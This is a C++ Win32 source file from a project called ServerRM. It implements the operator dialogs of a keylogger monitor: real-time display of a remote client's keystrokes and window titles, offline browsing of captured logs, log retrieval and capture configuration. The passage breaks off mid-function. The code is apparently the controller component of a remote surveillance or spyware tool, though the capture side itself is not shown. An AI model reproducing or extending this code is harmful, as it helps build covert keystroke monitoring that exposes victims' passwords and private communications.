
// * ServerRM project *
// KeylogMonDP.cpp: Contains all Dialog procks for KLM dialog box 
// and the four child dialog boxes.

#include "ServerInclude.h"

#define KLM_RT_DLG		0
#define KLM_OFF_DLG		1
#define KLM_RET_DLG		2
#define KLM_CONFIG_DLG	3

extern BOOL fFTSuccess;
extern int iFTStatus;
extern BOOL fFTDeleteFile;
extern PMONITORS g_PMonitors;
extern HINSTANCE hMainInstance;

extern WCHAR g_wszCurCliDIR[];
extern WCHAR g_wszCurCliIP[];
extern WCHAR g_wszCurCliNick[];

// Global variables
HWND g_KLMDlgBox;
static HWND hKLMRetDlg;
static jmp_buf jbFindNext;

// KLM Dialog Box Helper functions
void WINAPI OnKLMDialogInit(HWND hDlg);
BOOL CALLBACK KLMonRealtimeDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK KLMonOffDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK KLMonRetDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
BOOL CALLBACK KLMonConfigDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);

static BOOL KLMRetShowLogFileList(HWND hComboBox);
BOOL BuildKLTree(const WCHAR *pwszFilePath, HWND hDlg);
BOOL UpdateRTTree(HWND hDlg, const PDATA *pPData);
HTREEITEM FindSearchStr(const HWND hTree, const HTREEITEM hFromNode, const WCHAR *wszSearchStr,
    HTREEITEM *phFound/*, int iMatchField*/);

BOOL ReadKLConfigFile(KLCONFIG *pKLConfig);
BOOL WriteKLConfigFile(const KLCONFIG *pKLConfig);

DWORD WINAPI FTGetLogFiles(LPVOID lpArgs);

BOOL UpdateKLConfigUI(HWND hDlg);


BOOL CALLBACK KeylogMonDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {

    switch (message) {
        case WM_INITDIALOG:
        {
            // store this dialog box information in the global PMONITORS structure
            g_PMonitors.PluginMonitor[g_PMonitors.nPlugins].hDlgBox = hDlg;
            g_PMonitors.PluginMonitor[g_PMonitors.nPlugins].iPluginType = KEYLOGGER;
            g_PMonitors.nPlugins++;

            OnKLMDialogInit(hDlg);
            CenterWindow(hDlg);
            return TRUE;
        }


        case WM_COMMAND:
        {
            // handle commands from child controls
            switch (LOWORD(wParam)) {
                case IDC_KLM_CANCEL:
                {
                    SendMessage(hDlg, WM_CLOSE, 0, 0);
                    return TRUE;
                }

            }
            return FALSE;
        }


        case WM_NOTIFY:
        {
            // handle notifications from child controls
            switch (((NMHDR FAR *) lParam)->code) {
                case TCN_SELCHANGE:
                {
                    OnSelChanged(hDlg);
                    return TRUE;
                }
            }
            return FALSE;
        }

        case WN_DLG_NOTIFICATION:
        {
            if (wParam == WN_DLG_DISCONNECTED) {
                SetWindowText(hDlg, L"KeyLogger Monitor: Disconnected");
            }

            return TRUE;
        }


        case WM_CLIENT_RESPONSE:
        {
            DLGHDR *pDlgHdr = NULL;

            pDlgHdr = (DLGHDR*)GetWindowLong(hDlg, GWL_USERDATA);
            if (pDlgHdr != NULL) {

                switch (((PDATA*)lParam)->iMessage) {
                    case KLM_RT_KEYS:
                    {
                        SendMessage(pDlgHdr->hAllDlgs[KLM_RT_DLG], WM_CLIENT_RESPONSE, 0, lParam);
                        return TRUE;
                    }

                    case KLM_LOGFILES:
                    {
                        SendMessage(pDlgHdr->hAllDlgs[KLM_RET_DLG], WM_CLIENT_RESPONSE, 0, lParam);
                        return TRUE;
                    }
                    default:
                    {
                        if (lParam)
                            free((void*)lParam);
                    }
                }
                return FALSE;
            }
        }


        case WM_CLOSE:
        {
            DLGHDR *pDlgHdr = NULL;

            // free the pDlgHdr allocation
            pDlgHdr = (DLGHDR*)GetWindowLong(hDlg, GWL_USERDATA);

            // send message WM_CHILD_DLG_CLOSE to all child dialog boxes
            for (int i = 0; i < 4; ++i)
                if (pDlgHdr->hAllDlgs[i]) {
                    SendMessage(pDlgHdr->hAllDlgs[i], WM_CHILD_DLG_CLOSE, 0, 0);
                }

            if (pDlgHdr)
                LocalFree(pDlgHdr);

            // clear the global PMONITORS structure entry
            g_PMonitors.PluginMonitor[g_PMonitors.nPlugins].hDlgBox = 0;
            g_PMonitors.PluginMonitor[g_PMonitors.nPlugins].iPluginType = 0;
            g_PMonitors.nPlugins--;

            EndDialog(hDlg, 0);
            return TRUE;
        }

    }// switch(message)
    return FALSE;

}// KeylogMonDP()

void WINAPI OnKLMDialogInit(HWND hDlg) {
    int i, iRetVal;

    TCITEM tie;

    WCHAR wszDirPath[MAX_PATH + 1] = L"";
    WCHAR wszWndTitle[MAX_WND_TITLE + 1] = L"";

    DLGHDR *pDlgHdr = (DLGHDR*)LocalAlloc(LPTR, sizeof(DLGHDR));

    // Set Window Title
    wsprintf(wszWndTitle, L"KeyLogger Monitor: Connected to %s / %s", g_wszCurCliIP, g_wszCurCliNick);
    SetWindowText(hDlg, wszWndTitle);

    // Create the KLM directory
    wsprintf(wszDirPath, L"%s\\%s", g_wszCurCliDIR, FP_CLIENT_KLM_DIR);
    iRetVal = CreateDirectory(wszDirPath, NULL);

    // LogFiles directory
    wsprintf(wszDirPath, L"%s\\%s", g_wszCurCliDIR, FP_CLIENT_LOGFILES_DIR);
    iRetVal = CreateDirectory(wszDirPath, NULL);

    memset(pDlgHdr, 0, sizeof(DLGHDR));

    // Save a pointer to the DLGHDR structure. 
    SetWindowLong(hDlg, GWL_USERDATA, (LONG)pDlgHdr);

    // retrieve and save handle of the tab control
    pDlgHdr->hTab = GetDlgItem(hDlg, IDC_KLM_TAB);
    if (pDlgHdr->hTab == NULL) {
        // handle error
        MessageBox(0, L"cannot find tab", 0, 0);
        return;

    }

    // Add a tab for each of the four child dialog boxes. 
    tie.mask = TCIF_TEXT | TCIF_IMAGE;
    tie.iImage = -1;

    tie.pszText = L"RealTime Display";
    iRetVal = TabCtrl_InsertItem(pDlgHdr->hTab, 0, &tie);

    tie.pszText = L"Offline Display";
    iRetVal = TabCtrl_InsertItem(pDlgHdr->hTab, 1, &tie);

    tie.pszText = L"Retrieve Log Files";
    iRetVal = TabCtrl_InsertItem(pDlgHdr->hTab, 2, &tie);

    tie.pszText = L"Configuration";
    iRetVal = TabCtrl_InsertItem(pDlgHdr->hTab, 3, &tie);

    // create the four dialog boxes and save the handle in the DLGHDR structure
    pDlgHdr->hAllDlgs[KLM_RT_DLG] = CreateDialog(hMainInstance, MAKEINTRESOURCE(IDD_KLM_RT), hDlg, KLMonRealtimeDP);
    pDlgHdr->hAllDlgs[KLM_OFF_DLG] = CreateDialog(hMainInstance, MAKEINTRESOURCE(IDD_KLM_OFFLINE), hDlg, KLMonOffDP);
    pDlgHdr->hAllDlgs[KLM_RET_DLG] = CreateDialog(hMainInstance, MAKEINTRESOURCE(IDD_KLM_RETRIEVE), hDlg, KLMonRetDP);
    pDlgHdr->hAllDlgs[KLM_CONFIG_DLG] = CreateDialog(hMainInstance, MAKEINTRESOURCE(IDD_KLM_CONFIG), hDlg, KLMonConfigDP);

    // check for errors
    for (i = 0; i < 3; ++i) {
        if (pDlgHdr->hAllDlgs[i] == NULL) {
            iRetVal = GetLastError();
            PrintToStatusWindow(L"Error creating dialog box");
            SendMessage(hDlg, WM_CLOSE, 0, 0);
            return;
        }
    }

    // Simulate selection of the first item. 
    OnSelChanged(hDlg);

    return;

}// OnKLMDialogInit()

BOOL CALLBACK KLMonRealtimeDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    int iRetVal;
    static BOOL fStarted = FALSE;

    SPMARGS *pSPMArgs = NULL;

    // RealTime Display
    static HWND hRTTree = NULL;
    static HTREEITEM hFoundAt = NULL;
    WCHAR wszSearchStr[MAX_SEARCH_STR + 1];

    HBRUSH hbrBackground;

    switch (message) {
        case WM_INITDIALOG:
        {
            RECT rcTab = { 0,0,0,0 };

            // get the pointer to the DLGHDR structure from the parent window
            HWND hParentDlg = GetParent(hDlg);
            DLGHDR *pDlgHdr = (DLGHDR*)GetWindowLong(hParentDlg, GWL_USERDATA);

            // get the bounding rectangle of the client area of the tab control
            GetClientRect(pDlgHdr->hTab, &rcTab);

            // set the dialog box position to fit inside the tab control
            if ((iRetVal = SetWindowPos(hDlg, NULL, rcTab.left + 15, rcTab.top + 35,
                0, 0, SWP_NOZORDER | SWP_NOSIZE)) == 0) {
                iRetVal = GetLastError();
                PrintToStatusWindow(L"Unable to set dialog box position");
                return FALSE;
            }

            if ((hRTTree = GetDlgItem(hDlg, IDC_KLM_RT_TREE)) == NULL) {
                // error
                return TRUE;
            }

            return TRUE;
        }


        case WM_CTLCOLORDLG:	// fall-through

        case WM_CTLCOLORSTATIC:
        {
            HDC hdcStatic = (HDC)wParam;
            hbrBackground = CreateSolidBrush(RGB(255, 255, 255));
            SetTextColor(hdcStatic, RGB(0, 0, 0));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (LONG)hbrBackground;
        }


        case WM_CLIENT_RESPONSE:
        {
            // get the SGFILEDATA from the PDATA
            PDATA *pPData = NULL;

            pPData = (PDATA*)lParam;

            UpdateRTTree(hDlg, pPData);

            // free the memory after all processing has been done
            if (pPData)
                free(pPData);

            return TRUE;
        }

        case WM_COMMAND:
        {
            switch (LOWORD(wParam)) {
                case IDB_KLM_RT_FINDNEXT:
                {
                    // get the text entered
                    WORD wLen;

                    // first, get the number of characters
                    wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_SEARCH,
                        EM_LINELENGTH, 0, 0);
                    if (wLen > MAX_SEARCH_STR) {
                        MessageBox(hDlg, L"Search string too long. Must be less than 128 chars.", 0, 0);
                        return FALSE;
                    }
                    if (wLen == 0) {
                        MessageBox(hDlg, L"Please enter a search string.", 0, 0);
                        return FALSE;
                    }

                    // Put the number of characters into first word of buffer. 
                    *((LPWORD)wszSearchStr) = wLen;

                    // Get the characters. 
                    SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_SEARCH,
                        EM_GETLINE, (WPARAM)0,       // line 0 
                        (LPARAM)wszSearchStr);

                    // Null-terminate the string. 
                    wszSearchStr[wLen] = 0;

                    switch (setjmp(jbFindNext)) {
                        case 0:
                        {
                            if ((hFoundAt = FindSearchStr(hRTTree, TreeView_GetRoot(hRTTree), wszSearchStr, &hFoundAt)) == NULL) {
                                MessageBox(hDlg, L"Not Found", L"Find", MB_ICONINFORMATION);
                            }
                            break;
                        }

                        case 1:
                        {
                            if (hFoundAt) {
                                TreeView_SelectItem(hRTTree, hFoundAt);
                                TreeView_EnsureVisible(hRTTree, hFoundAt);
                            } else
                                MessageBox(hDlg, L"Not Found", L"Find", MB_ICONINFORMATION);
                            break;
                        }
                    }

                    return TRUE;
                }

                case IDB_KLM_RT_START:
                {
                    __try {
                        if ((pSPMArgs = (SPMARGS*)malloc(sizeof(SPMARGS))) == NULL) {
                            // WriteToLog()
                            return TRUE;
                        }
                        memset(pSPMArgs, 0, sizeof(SPMARGS));

                        // fill KLMDATA 
                        pSPMArgs->cmd = SPM_SENDDATA;
                        pSPMArgs->iFromPlugin = KEYLOGGER;
                        pSPMArgs->MNTRData.KLMData.cmd = KLIF_RT_START;

                        if ((iRetVal = ServerPluginManager(NULL, pSPMArgs, NULL)) == FALSE) {
                            MessageBox(hDlg, L"Error sending data to SPM", L"Realtime Monitoring", MB_ICONEXCLAMATION);
                            return TRUE;
                        }
                        fStarted = TRUE;

                        // disable the Start button
                        EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_START), FALSE);

                        // enable the Stop button
                        EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_STOP), TRUE);

                        return TRUE;
                    }
                    __finally {
                        if (pSPMArgs) {
                            free(pSPMArgs);
                            pSPMArgs = NULL;
                        }
                    }
                }

                case IDB_KLM_RT_STOP:
                {
                    __try {
                        if ((pSPMArgs = (SPMARGS*)malloc(sizeof(SPMARGS))) == NULL) {
                            // WriteToLog()
                            return TRUE;
                        }
                        memset(pSPMArgs, 0, sizeof(SPMARGS));

                        // fill KLMDATA 
                        pSPMArgs->cmd = SPM_SENDDATA;
                        pSPMArgs->iFromPlugin = KEYLOGGER;
                        pSPMArgs->MNTRData.KLMData.cmd = KLIF_RT_STOP;

                        if ((iRetVal = ServerPluginManager(NULL, pSPMArgs, NULL)) == FALSE) {
                            MessageBox(hDlg, L"Error sending data to SPM", L"Realtime Monitoring", MB_ICONEXCLAMATION);
                            return TRUE;
                        }
                        fStarted = FALSE;

                        // enable the Start button
                        EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_START), TRUE);

                        // disable the Stop button
                        EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_STOP), FALSE);

                        return TRUE;
                    }
                    __finally {
                        if (pSPMArgs) {
                            free(pSPMArgs);
                            pSPMArgs = NULL;
                        }
                    }
                }

                case IDC_KLM_RT_TREE:
                {
                    return TRUE;
                }

            }// switch(LOWORD(wParam))
            return FALSE;
        }

        case WM_NOTIFY:
        {
            switch (((LPNMHDR)lParam)->code) {
                case TVN_SELCHANGED:
                {
                    HTREEITEM	hSelectedItem = NULL;
                    TVITEM		tviSelectedItem;
                    WCHAR		wszSelectedNodeText[MAX_PATH + 1] = L"";

                    // clear the window title edit control
                    SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_ATITLE, EM_SETSEL, 0, -1);
                    SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_ATITLE, EM_REPLACESEL,
                        FALSE, //operation cannot be undone
                        (LPARAM)(LPCSTR)L"");

                    // clear the keys pressed edit control
                    SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_KEYS, EM_SETSEL, 0, -1);
                    SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_KEYS, EM_REPLACESEL,
                        FALSE, //operation cannot be undone
                        (LPARAM)(LPCSTR)L"");

                    //get handle to selected item
                    if ((hSelectedItem = (HTREEITEM)SendDlgItemMessage(hDlg, IDC_KLM_RT_TREE,
                        TVM_GETNEXTITEM, TVGN_CARET, (LPARAM)hSelectedItem)) != NULL) {
                        TreeView_EnsureVisible(hRTTree, hSelectedItem);

                        //get info about selected item
                        memset(&tviSelectedItem, 0, sizeof(tviSelectedItem));
                        tviSelectedItem.mask = TVIF_PARAM;
                        tviSelectedItem.hItem = hSelectedItem;

                        if (SendDlgItemMessage(hDlg, IDC_KLM_RT_TREE, TVM_GETITEM, TVGN_CARET,
                            (LPARAM)&tviSelectedItem) == FALSE) {
                            // display error in edit boxes
                            return TRUE;
                        }

                        // determine the type of the node (process node/time node/handle node)
                        if (TreeView_GetParent(hRTTree, hSelectedItem) == NULL) {
                            // it is a process node
                        } else if (TreeView_GetParent(hRTTree, TreeView_GetParent(hRTTree, hSelectedItem)) == NULL) {
                            // it is a time node
                            KLTIMENODE *pKLTimeNode = NULL;
                            if ((pKLTimeNode = (KLTIMENODE*)tviSelectedItem.lParam) == NULL) {
                                // display error in the edit boxes
                                return TRUE;
                            }
                        } else {
                            // it is a handle node
                            KLHANDLENODE *pKLHandleNode = NULL;
                            if ((pKLHandleNode = (KLHANDLENODE*)tviSelectedItem.lParam) == NULL) {
                                // display error in the edit boxes
                                return TRUE;
                            }

                            // display window title
                            if (wcscmp(pKLHandleNode->wszWndTitle, L"") == 0) {
                                SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_ATITLE, WM_SETTEXT, 0,
                                    (LPARAM)L"No Window Title");
                            } else {
                                SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_ATITLE, WM_SETTEXT, 0,
                                    (LPARAM)pKLHandleNode->wszWndTitle);
                            }

                            // display the keys
                            if (wcscmp(pKLHandleNode->wszKeys, L"") == 0) {
                                SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_KEYS, WM_SETTEXT, 0,
                                    (LPARAM)L"No Keys Pressed");
                            } else {
                                SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_KEYS, WM_SETTEXT, 0,
                                    (LPARAM)pKLHandleNode->wszKeys);
                            }
                        }
                    }
                }// case TVN_SELCHANGED
                return TRUE;

            }// switch ( ((LPNMHDR)lParam)->code )
            return FALSE;

        }// case WM_NOTIFY

        case WM_CHILD_DLG_ACTIVATE:
        {
            return TRUE;
        }

        case WM_CHILD_DLG_DEACTIVATE:
        {
            FreeTreeViewMemory(hRTTree);

            // delete treeview items
            TreeView_DeleteAllItems(hRTTree);

            // clear application title edit control
            SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_ATITLE, EM_SETSEL, 0, -1);
            SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_ATITLE, EM_REPLACESEL, FALSE, (LPARAM)(LPCSTR)L"");

            // clear keys pressed edit control
            SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_DATA, EM_SETSEL, 0, -1);
            SendDlgItemMessage(hDlg, IDC_KLM_RT_EDIT_DATA, EM_REPLACESEL, FALSE, (LPARAM)(LPCSTR)L"");

            if (fStarted == FALSE)
                return TRUE;

            __try {
                if ((pSPMArgs = (SPMARGS*)malloc(sizeof(SPMARGS))) == NULL) {
                    // WriteToLog()
                    return TRUE;
                }
                memset(pSPMArgs, 0, sizeof(SPMARGS));

                // fill KLMDATA 
                pSPMArgs->cmd = SPM_SENDDATA;
                pSPMArgs->iFromPlugin = KEYLOGGER;
                pSPMArgs->MNTRData.KLMData.cmd = KLIF_RT_STOP;

                if ((iRetVal = ServerPluginManager(NULL, pSPMArgs, NULL)) == FALSE) {
                    MessageBox(hDlg, L"Error sending data to SPM", L"Realtime Monitoring", MB_ICONEXCLAMATION);
                    return TRUE;
                }
                fStarted = FALSE;

                // enable Start button
                EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_START), TRUE);

                // disable Stop button
                EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_STOP), FALSE);

                return TRUE;
            }
            __finally {
                if (pSPMArgs) {
                    free(pSPMArgs);
                    pSPMArgs = NULL;
                }
            }

        }

        case WM_CHILD_DLG_CLOSE:
        {
            FreeTreeViewMemory(hRTTree);
            TreeView_DeleteAllItems(hRTTree);

            if (fStarted == FALSE)
                return TRUE;

            __try {
                if ((pSPMArgs = (SPMARGS*)malloc(sizeof(SPMARGS))) == NULL) {
                    // WriteToLog()
                    return TRUE;
                }
                memset(pSPMArgs, 0, sizeof(SPMARGS));

                // fill KLMDATA 
                pSPMArgs->cmd = SPM_SENDDATA;
                pSPMArgs->iFromPlugin = KEYLOGGER;
                pSPMArgs->MNTRData.KLMData.cmd = KLIF_RT_STOP;

                if ((iRetVal = ServerPluginManager(NULL, pSPMArgs, NULL)) == FALSE) {
                    MessageBox(hDlg, L"Error sending data to SPM", L"Realtime Monitoring", MB_ICONEXCLAMATION);
                    return TRUE;
                }
                fStarted = FALSE;

                // enable Start button
                EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_START), TRUE);

                // disable Stop button
                EnableWindow(GetDlgItem(hDlg, IDB_KLM_RT_STOP), FALSE);

                return TRUE;
            }
            __finally {
                if (pSPMArgs) {
                    free(pSPMArgs);
                    pSPMArgs = NULL;
                }
            }
        }

    }// switch(message)
    return FALSE;

}// KLMonRealtimeDP

BOOL CALLBACK KLMonOffDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
    int iRetVal;

    HBRUSH hbrBackground;

    static HWND hTree = NULL;
    static HWND	hComboBox = NULL;
    static HTREEITEM hFoundAt = NULL;

    switch (message) {
        case WM_INITDIALOG:
        {
            RECT rcTab = { 0,0,0,0 };

            if ((hTree = GetDlgItem(hDlg, IDC_KLM_OFF_TREE)) == NULL) {
                PrintToStatusWindow(L"Handle to offline tree view cannot be obtained");
            }

            if ((hComboBox = GetDlgItem(hDlg, IDC_KLM_OFF_COMBO)) == NULL) {
                PrintToStatusWindow(L"Handle to offline combo box cannot be obtained");
            }

            // get the pointer to the DLGHDR structure from the parent window
            HWND hParentDlg = GetParent(hDlg);
            DLGHDR *pDlgHdr = (DLGHDR*)GetWindowLong(hParentDlg, GWL_USERDATA);

            // get the bounding rectangle of the client area of the tab control
            GetClientRect(pDlgHdr->hTab, &rcTab);

            // set the dialog box position to fit inside the tab control
            if ((iRetVal = SetWindowPos(hDlg, NULL, rcTab.left + 15, rcTab.top + 35,
                0, 0, SWP_NOZORDER | SWP_NOSIZE)) == 0) {
                iRetVal = GetLastError();
                PrintToStatusWindow(L"Unable to set dialog box position");
                return FALSE;
            }

            // show the log file list in the combo box
            KLMRetShowLogFileList(hComboBox);

            return TRUE;
        }

        case WM_CTLCOLORDLG:	// fall-through

        case WM_CTLCOLORSTATIC:
        {
            HDC hdcStatic = (HDC)wParam;
            hbrBackground = CreateSolidBrush(RGB(255, 255, 255));
            SetTextColor(hdcStatic, RGB(0, 0, 0));
            SetBkMode(hdcStatic, TRANSPARENT);
            return (LONG)hbrBackground;
        }

        case WM_COMMAND:
        {
            switch (LOWORD(wParam)) {
                // ** Offline Display dialog box controls **

                case IDB_KLM_OFF_BUILD:
                {
                    int iSelItemIndex;
                    WCHAR wszLogFilePath[MAX_PATH + 1];
                    WCHAR wszLogFileName[MAX_FILE_NAME + 1] = L"";

                    // disable Build button
                    EnableWindow((HWND)lParam, FALSE);

                    TreeView_DeleteAllItems(hTree);

                    //get handle to combobox
                    hComboBox = GetDlgItem(hDlg, IDC_KLM_OFF_COMBO);

                    //get index
                    iSelItemIndex = (int)SendMessage(hComboBox, CB_GETCURSEL, 0, 0);

                    //get string
                    iRetVal = SendMessage(hComboBox, CB_GETLBTEXT, iSelItemIndex, (LPARAM)wszLogFileName);

                    if (wcscmp(wszLogFileName, L"") == 0)
                        return FALSE;

                    // clear the edit controls


                    // construct the log file path
                    swprintf_s(wszLogFilePath, MAX_PATH + 1, L"%s\\%s\\%s\\%s", FP_CLIENTS_DIR, g_wszCurCliIP,
                        FP_CLIENT_LOGFILES_DIR, wszLogFileName);

                    BuildKLTree(wszLogFilePath, hDlg);

                    // re-enable Build button
                    EnableWindow((HWND)lParam, TRUE);
                    return TRUE;
                }

                case IDB_KLM_OFF_FINDNEXT:
                {
                    WORD wLen;
                    WCHAR wszSearchStr[MAX_SEARCH_STR + 1];

                    // first, get the number of characters
                    wLen = (WORD)SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_SEARCH,
                        EM_LINELENGTH, 0, 0);
                    if (wLen > MAX_SEARCH_STR - 1) {
                        MessageBox(hDlg, L"Search string too long. Must be less than 128 characters.",
                            L"Offline Monitoring", MB_ICONINFORMATION);
                        return TRUE;
                    }
                    if (wLen == 0) {
                        MessageBox(hDlg, L"Please enter a search string.", 0, 0);
                        return TRUE;
                    }

                    // Put the number of characters into first word of buffer. 
                    *((LPWORD)wszSearchStr) = wLen;

                    // Get the characters. 
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_SEARCH,
                        EM_GETLINE, (WPARAM)0,       // line 0 
                        (LPARAM)wszSearchStr);

                    // Null-terminate the string. 
                    wszSearchStr[wLen] = 0;

                    switch (setjmp(jbFindNext)) {
                        case 0:
                        {
                            if ((hFoundAt = FindSearchStr(hTree, TreeView_GetRoot(hTree), wszSearchStr, &hFoundAt)) == NULL) {
                                MessageBox(hDlg, L"Not Found", L"Find", MB_ICONINFORMATION);
                            }
                            break;
                        }

                        case 1:
                        {
                            if (hFoundAt) {
                                TreeView_SelectItem(hTree, hFoundAt);
                                TreeView_EnsureVisible(hTree, hFoundAt);
                            } else
                                MessageBox(hDlg, L"Not Found", L"Find", MB_ICONINFORMATION);
                            break;
                        }
                    }
                    return TRUE;
                }

                case IDB_KLM_OFF_STOP:
                {
                    return TRUE;
                }

                case IDC_KLM_OFF_TREE:
                {
                    return TRUE;
                }

                case IDC_KLM_OFF_COMBO:
                {
                    if (HIWORD(wParam) == CBN_SELCHANGE) {
                        // enable Build button
                        EnableWindow(GetDlgItem(hDlg, IDB_KLM_OFF_BUILD), TRUE);
                    }
                    return TRUE;
                }

            }// switch(LOWORD(lParam)
            return FALSE;


        }

        case WM_CHILD_DLG_ACTIVATE:
        {
            // This child dialog is now active. Perform any updates required.

            // show the log file list in the combo box
            KLMRetShowLogFileList(hComboBox);

            return TRUE;
        }

        case WM_CHILD_DLG_CLOSE:

        case WM_CHILD_DLG_DEACTIVATE:
        {
            FreeTreeViewMemory(hTree);

            // delete treeview items
            TreeView_DeleteAllItems(hTree);

            // clear application title edit control
            SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE, EM_SETSEL, 0, -1);
            SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE, EM_REPLACESEL, FALSE, (LPARAM)(LPCSTR)L"");

            // clear keys pressed edit control
            SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_KEYS, EM_SETSEL, 0, -1);
            SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_KEYS, EM_REPLACESEL, FALSE, (LPARAM)(LPCSTR)L"");

            return TRUE;
        }

        case WM_NOTIFY:
        {
            switch (((LPNMHDR)lParam)->code) {
                case TVN_SELCHANGED:
                {
                    HTREEITEM	hSelectedItem = NULL;
                    TVITEM		tviSelectedItem;
                    WCHAR		wszSelectedNodeText[MAX_PATH + 1] = L"";

                    // clear the window title edit control
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE, EM_SETSEL, 0, -1);
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE, EM_REPLACESEL,
                        FALSE, //operation cannot be undone
                        (LPARAM)(LPCSTR)L"");

                    // clear the window handle edit control
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE2, EM_SETSEL, 0, -1);
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE2, EM_REPLACESEL,
                        FALSE, //operation cannot be undone
                        (LPARAM)(LPCSTR)L"");

                    // clear the keys pressed edit control
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_KEYS, EM_SETSEL, 0, -1);
                    SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_KEYS, EM_REPLACESEL,
                        FALSE, //operation cannot be undone
                        (LPARAM)(LPCSTR)L"");

                    //get handle to selected item
                    if ((hSelectedItem = (HTREEITEM)SendDlgItemMessage(hDlg, IDC_KLM_OFF_TREE,
                        TVM_GETNEXTITEM, TVGN_CARET, (LPARAM)hSelectedItem)) != NULL) {
                        TreeView_EnsureVisible(hTree, hSelectedItem);

                        //get info about selected item
                        memset(&tviSelectedItem, 0, sizeof(tviSelectedItem));
                        tviSelectedItem.mask = TVIF_PARAM;
                        tviSelectedItem.hItem = hSelectedItem;

                        if (SendDlgItemMessage(hDlg, IDC_KLM_OFF_TREE, TVM_GETITEM, TVGN_CARET,
                            (LPARAM)&tviSelectedItem) == FALSE) {
                            // display error in edit boxes
                            return TRUE;
                        }

                        // determine the type of the node (process node/time node/handle node)
                        if (TreeView_GetParent(hTree, hSelectedItem) == NULL) {
                            // it is a process node
                        } else if (TreeView_GetParent(hTree, TreeView_GetParent(hTree, hSelectedItem)) == NULL) {
                            // it is a time node
                            KLTIMENODE *pKLTimeNode = NULL;
                            if ((pKLTimeNode = (KLTIMENODE*)tviSelectedItem.lParam) == NULL) {
                                // display error in the edit boxes
                                return TRUE;
                            }
                        } else {
                            // it is a handle node
                            KLHANDLENODE *pKLHandleNode = NULL;
                            if ((pKLHandleNode = (KLHANDLENODE*)tviSelectedItem.lParam) == NULL) {
                                // display error in the edit boxes
                                return TRUE;
                            }

                            // display window title
                            if (wcscmp(pKLHandleNode->wszWndTitle, L"") == 0) {
                                SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE, WM_SETTEXT, 0,
                                    (LPARAM)L"No Window Title");
                            } else {
                                SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE, WM_SETTEXT, 0,
                                    (LPARAM)pKLHandleNode->wszWndTitle);
                            }

                            // display window handle
                            wsprintf(wszSelectedNodeText, L"%X", pKLHandleNode->hWnd);
                            SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_ATITLE2,
                                WM_SETTEXT, 0, (LPARAM)wszSelectedNodeText);

                            // display the keys
                            if (wcscmp(pKLHandleNode->wszKeys, L"") == 0) {
                                SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_KEYS, WM_SETTEXT, 0,
                                    (LPARAM)L"No Keys Pressed");
                            } else {
                                SendDlgItemMessage(hDlg, IDC_KLM_OFF_EDIT_KEYS, WM_SETTEXT, 0,
                                    (LPARAM)pKLHandleNode->wszKeys);
                            }
                        }
                    }
                }// case TVN_SELCHANGED
                return TRUE;

            }// switch ( ((LPNMHDR)lParam)->code )
            return FALSE;

        }// case WM_NOTIFY

    }// switch(message)
    return FALSE;

}

BOOL CALLBACK KLMonRetDP(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {

    int iRetVal;

    // Retrieve log files
    SYSTEMTIME stFromDate;
    SYSTEMTIME stToDate;
    SYSTEMTIME stToday;

    SPMARGS *pSPMArgs;
    MNTRDATA MNTRDataOut;

    HANDLE hFTThread = NULL;

    HBRUSH hbrBackground;// = CreateSolidBrush(RGB(0, 0, 0));

    switch (message) {
        case WM_INITDIALOG:
        {
            RECT rcTab = { 0,0,0,0 };

            // get the pointer to the DLGHDR structure from the parent window
            HWND hParentDlg = GetParent(hDlg);
            DLGHDR *pDlgHdr = (DLGHDR*)GetWindowLong(hParentDlg, GWL_USERDATA);

            // get the bounding rectangle of the client area of the tab control
            GetClientRect(pDlgHdr->hTab, &rcTab);

            // set the dialog box position to fit inside the tab control
            if ((iRetVal = SetWindowPos(hDlg, NULL, rcTab.left + 15, rcTab.top + 35,
                0, 0, SWP_NOZORDER | SWP_NOSIZE)) == 0) {
                iRetVal = GetLastError();
